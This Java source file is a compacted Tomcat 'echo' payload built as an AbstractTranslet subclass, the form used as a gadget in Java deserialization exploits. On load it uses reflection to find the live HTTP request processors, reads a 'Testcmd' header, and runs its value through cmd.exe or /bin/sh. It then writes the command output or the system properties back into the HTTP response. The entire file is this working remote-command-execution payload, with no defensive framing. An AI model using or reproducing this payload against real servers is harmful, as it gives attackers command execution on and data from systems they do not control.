package echo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;

/**
 * @author m01e
 * @since 2022/9/3
 */
public class TomcatEchoPayloadMin extends AbstractTranslet implements Serializable {
    public TomcatEchoPayloadMin() throws Exception{transletVersion=101;Object o;Object resp;String s;boolean done=false;Thread[] ts=(Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");for (int i = 0; i < ts.length; i++) {Thread t = ts[i];if (t == null) {continue;}s = t.getName();if (!s.contains("exec") && s.contains("http")){o=getFV(t, "target");if (!(o instanceof Runnable)) {continue;}try {o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");} catch (Exception e) {continue;}java.util.List ps = (java.util.List) getFV(o, "processors");for (int j = 0; j < ps.size(); j++) {Object p = ps.get(j);o = getFV(p, "req");resp = o.getClass().getMethod("getResponse", new Class[0]).invoke(o, new Object[0]);s = (String) o.getClass().getMethod("getHeader",new Class[]{String.class}).invoke(o,new Object[]{"Testcmd"});if(s!=null&&!s.isEmpty()){resp.getClass().getMethod("setStatus",new Class[]{int.class}).invoke(resp,new Object[]{new Integer(200)});String[] cmd=System.getProperty("os.name").toLowerCase().contains("window")?new String[]{"cmd.exe","/c",s}:new String[]{"/bin/sh", "-c", s};wb(resp,new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes());done=true;}if((s==null||s.isEmpty())&&done){wb(resp,System.getProperties().toString().getBytes());}if(done){break;}}if(done){break;}}}}
    private static void wb(Object resp,byte[] bs)throws Exception{Object o;Class clazz;try{clazz=Class.forName("org.apache.tomcat.util.buf.ByteChunk");o=clazz.newInstance();clazz.getDeclaredMethod("setBytes",new Class[]{byte[].class,int.class, int.class}).invoke(o,new Object[]{bs,new Integer(0),new Integer(bs.length)});resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp,new Object[]{o});}catch (Exception e) {clazz = Class.forName("java.nio.ByteBuffer");o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});}}

    private static Object getFV(Object o, String s) throws Exception {java.lang.reflect.Field f = null;Class clazz = o.getClass();while (clazz != Object.class) {try {f = clazz.getDeclaredField(s);break;} catch (NoSuchFieldException e) {clazz = clazz.getSuperclass();}}if (f == null) {throw new NoSuchFieldException(s);}f.setAccessible(true);return f.get(o);}

    @Override
    public void transform(DOM d, SerializationHandler[] hs) throws TransletException {}
    @Override
    public void transform(DOM d, DTMAxisIterator it, SerializationHandler h) throws TransletException {}
}
